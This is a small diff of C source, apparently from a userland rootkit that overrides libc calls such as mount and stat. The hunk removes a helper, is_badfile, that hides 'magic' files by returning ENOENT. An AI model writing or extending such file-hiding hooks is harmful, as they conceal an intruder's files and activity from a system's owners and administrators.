@@ -390,19 +390,6 @@ int mount(const char *source, const char *target,
     return hooked_mount(source, target, filesystemtype, mountflags, data);
 }
 
-int is_badfile(const char *pathname){
-    char realpathname[PATH_MAX];
-    realpath(pathname, realpathname);
-    if (is_magicfile(realpathname)){
-        #ifdef DEBUG
-        printf("[+] Magicfile found, returning NOENT: %s\n", realpathname);
-        #endif
-        errno = ENOENT;
-        return -1;
-    }
-    return 0;
-}
-
 int stat(const char *path, struct stat *buf)
 {
     #ifdef DEBUG
